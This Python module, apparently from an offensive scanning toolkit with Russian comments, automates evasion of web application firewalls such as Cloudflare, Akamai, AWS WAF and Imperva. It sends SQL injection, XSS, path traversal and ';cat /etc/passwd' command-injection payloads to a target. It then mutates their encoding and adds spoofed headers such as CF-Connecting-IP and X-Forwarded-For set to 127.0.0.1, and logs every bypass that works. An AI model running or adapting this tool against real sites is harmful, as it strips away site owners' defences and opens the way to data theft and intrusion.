"""waf_evasion v2 — WAF-specific bypass routing with mutation engine v3.

Тактика зависит от типа WAF (из session.findings или --extra waf=<type>):
  Cloudflare  → cf-connecting-ip spoof + case_mix + whitespace_comment
  Akamai      → x-akamai headers + triple_encode + retry-after
  AWS WAF     → chunked hints + sql_comment_split
  Imperva     → X-Forwarded-For + Referer chain + overlong_utf8
  ModSecurity → double_encode + sql_comment_split + case_mix
  Sucuri      → x-sucuri-id spoof + html_decimal
  unknown     → generic chain (depth=2)

Verify ×2: bypass подтверждается повторным запросом.
"""
from core.http import HttpClient
from core.waf_bypass import mutate_until_pass, is_blocked
from core.verify import confidence, is_signal


# WAF-specific header bypasses
WAF_HEADER_TACTICS = {
    "Cloudflare": [
        ("CF-Connecting-IP", "127.0.0.1"),
        ("True-Client-IP", "127.0.0.1"),
        ("X-Forwarded-For", "127.0.0.1"),
        ("CF-IPCountry", "T1"),
        ("CDN-Loop", "cloudflare"),
    ],
    "Akamai": [
        ("X-Akamai-Edgescape", "True"),
        ("X-Akamai-Config-Log-Detail", "True"),
        ("X-Forwarded-For", "127.0.0.1"),
    ],
    "AWS WAF": [
        ("X-Amzn-Trace-Id", "Root=1-omni"),
        ("X-Forwarded-For", "127.0.0.1"),
    ],
    "Imperva": [
        ("X-Forwarded-For", "127.0.0.1"),
        ("Referer", "https://www.google.com/"),
        ("X-Forwarded-Host", "www.google.com"),
    ],
    "Sucuri": [
        ("X-Sucuri-ID", "1"),
        ("X-Forwarded-For", "127.0.0.1"),
    ],
    "F5 BIG-IP": [
        ("X-WA-Info", "1"),
        ("X-Forwarded-For", "127.0.0.1"),
    ],
    "ModSecurity": [
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Remote-Addr", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
    ],
    "Fastly": [
        ("X-Forwarded-For", "127.0.0.1"),
        ("Fastly-Client-IP", "127.0.0.1"),
    ],
}

# тактики мутаций per WAF
WAF_MUTATION_TACTICS = {
    "Cloudflare":  ["case_mix", "whitespace_comment", "double_encode"],
    "Akamai":      ["triple_encode", "case_mix", "overlong_utf8"],
    "AWS WAF":     ["sql_comment_split", "whitespace_encoded", "case_mix"],
    "Imperva":     ["overlong_utf8", "html_decimal", "case_mix"],
    "Sucuri":      ["html_decimal", "case_mix", "double_encode"],
    "ModSecurity": ["double_encode", "sql_comment_split", "case_mix"],
    "F5 BIG-IP":   ["triple_encode", "sql_comment_split"],
    "Fastly":      ["case_mix", "whitespace_comment"],
}

# базовые attack payloads для проверки WAF
BASE_ATTACKS = [
    ("sqli_or",     chr(39) + " OR 1=1-- -"),
    ("sqli_union",  chr(39) + " UNION SELECT NULL,NULL-- -"),
    ("xss",         "<script>alert(1)</script>"),
    ("traversal",   "../../../../etc/passwd"),
    ("cmd",         ";cat /etc/passwd"),
]


def _get_waf_type(session):
    """Определяет тип WAF из --extra, session.findings, или unknown."""
    # 1. --extra waf=Cloudflare
    for x in getattr(session, "extra", []) or []:
        if x.startswith("waf="):
            return x[4:].strip()

    # 2. из findings сессии (waf_detect)
    for f in getattr(session, "findings", []) or []:
        kind = str(f.get("kind", "") or f.get("type", ""))
        if "waf" in kind.lower():
            detail = f.get("detail", "") or f.get("waf", "")
            # "waf=Cloudflare" или "Cloudflare"
            if "=" in str(detail):
                val = str(detail).split("=", 1)[1].strip()
                if val and val != "unknown":
                    return val
            elif detail and detail != "unknown":
                return str(detail).strip()

    return "unknown"


class WafEvasion:
    def run(self, session, logger):
        http = HttpClient(session, logger)
        target = session.target

        waf_type = _get_waf_type(session)
        print("[waf_evasion v2] target: " + target)
        print("[waf_evasion v2] waf_type: " + waf_type)

        # === 1. baseline: raw attack → заблокирован? ===
        print()
        print("[waf_evasion v2] baseline: raw attack")
        baseline_blocks = {}
        for name, payload in BASE_ATTACKS:
            try:
                r = http.get(target, params={"omni_x": payload})
            except Exception:
                continue
            if not r:
                continue
            blocked = r.status_code in (403, 406, 429, 501, 502, 503)
            baseline_blocks[name] = {
                "status": r.status_code,
                "blocked": blocked,
                "payload": payload,
            }
            marker = "BLOCK" if blocked else "     "
            print("  [" + marker + "] " + name + ": " + str(r.status_code))

        blocked_attacks = [n for n, b in baseline_blocks.items() if b["blocked"]]
        if not blocked_attacks:
            print()
            print("[waf_evasion v2] no attacks blocked — WAF not blocking or too lax")
            print("[waf_evasion v2] target may be unprotected")
            return {
                "waf_type": waf_type,
                "blocked_attacks": [],
                "bypasses": [],
                "findings": [],
            }

        print()
        print("[waf_evasion v2] " + str(len(blocked_attacks)) + "/" + str(len(BASE_ATTACKS)) + " attacks blocked")

        findings = []
        bypasses = []

        # === 2. mutation-based bypass ===
        print()
        print("[waf_evasion v2] mutation bypass:")

        tactic_names = WAF_MUTATION_TACTICS.get(waf_type, [])

        for attack_name in blocked_attacks:
            original = baseline_blocks[attack_name]["payload"]

            # try mutation until pass
            result = mutate_until_pass(
                http, target, original,
                method="GET", verbose=True
            )

            if result["mutation"] is None:
                continue  # все мутации заблокированы

            # verify ×2
            try:
                r2 = http.get(target + ("&" if "?" in target else "?") + "omni_x=" + result["payload"])
            except Exception:
                r2 = None

            if not r2 or r2.status_code in (403, 406, 429, 501, 502, 503):
                continue

            conf = confidence(0.9, 1.0)
            if not is_signal(conf, floor=0.55, module="waf_evasion"):
                continue

            finding = {
                "type": "waf_bypass_mutation",
                "severity": "high",
                "attack": attack_name,
                "original": original,
                "mutated": result["payload"],
                "mutation": result["mutation"],
                "baseline_status": baseline_blocks[attack_name]["status"],
                "bypass_status": r2.status_code,
                "waf_type": waf_type,
                "confidence": conf,
            }
            bypasses.append(finding)
            findings.append(finding)
            print("  BYPASS via " + result["mutation"] + " (" + attack_name + ")")
            logger.finding("waf_evasion", "high",
                           attack_name + " via " + result["mutation"])

        # === 3. header-based bypass ===
        print()
        print("[waf_evasion v2] header bypass:")

        header_list = WAF_HEADER_TACTICS.get(waf_type, [])
        # если для типа WAF тактики нет — пробуем generic набор
        if not header_list:
            header_list = [
                ("X-Forwarded-For", "127.0.0.1"),
                ("X-Real-IP", "127.0.0.1"),
                ("X-Originating-IP", "127.0.0.1"),
                ("X-Remote-Addr", "127.0.0.1"),
                ("X-Client-IP", "127.0.0.1"),
                ("CF-Connecting-IP", "127.0.0.1"),
                ("True-Client-IP", "127.0.0.1"),
                ("X-Original-URL", "/admin"),
                ("X-Rewrite-URL", "/admin"),
            ]

        for attack_name in blocked_attacks[:2]:
            original = baseline_blocks[attack_name]["payload"]

            for h_name, h_val in header_list:
                try:
                    r = http.get(target, params={"omni_x": original},
                                 headers={h_name: h_val})
                except Exception:
                    continue
                if not r:
                    continue

                if r.status_code not in (403, 406, 429, 501, 502, 503):
                    # header снял блок
                    try:
                        r2 = http.get(target, params={"omni_x": original},
                                      headers={h_name: h_val})
                    except Exception:
                        r2 = None
                    if not r2 or r2.status_code in (403, 406, 429, 501, 502, 503):
                        continue

                    conf = confidence(0.85, 1.0)
                    if not is_signal(conf, floor=0.55, module="waf_evasion"):
                        continue

                    finding = {
                        "type": "waf_bypass_header",
                        "severity": "high",
                        "attack": attack_name,
                        "header": h_name,
                        "header_value": h_val,
                        "baseline_status": baseline_blocks[attack_name]["status"],
                        "bypass_status": r2.status_code,
                        "waf_type": waf_type,
                        "confidence": conf,
                    }
                    bypasses.append(finding)
                    findings.append(finding)
                    print("  BYPASS via header " + h_name + " (" + attack_name + ")")
                    logger.finding("waf_evasion", "high",
                                   attack_name + " via header " + h_name)
                    break

        print()
        print("[waf_evasion v2] findings: " + str(len(findings)))
        print("[waf_evasion v2] bypasses: " + str(len(bypasses)))

        logger.info("waf_evasion",
                    waf_type=waf_type,
                    blocked=len(blocked_attacks),
                    bypasses=len(bypasses))

        return {
            "waf_type": waf_type,
            "blocked_attacks": blocked_attacks,
            "bypasses": bypasses,
            "findings": findings,
        }
